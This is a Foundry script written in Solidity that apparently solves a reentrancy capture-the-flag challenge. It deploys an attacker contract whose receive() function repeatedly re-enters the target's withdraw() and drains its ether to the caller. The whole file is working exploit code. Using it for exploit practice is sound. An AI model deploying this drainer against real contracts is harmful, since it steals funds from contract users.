// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address payable reentrance = payable(vm.envAddress("REENTRANCY_INSTANCE")); // already has 0.001 ether in there

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        Player player = new Player{value: 0.001 ether}(reentrance);
        player.exp();

        vm.stopBroadcast();
    }
}

contract Player {
    address instance;
    constructor(address payable _instance) payable {
        instance = _instance;
        instance.call{value: 0.001 ether}(abi.encodeWithSignature("donate(address)", address(this)));
    }

    function exp() external {
        instance.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
        }
    }
}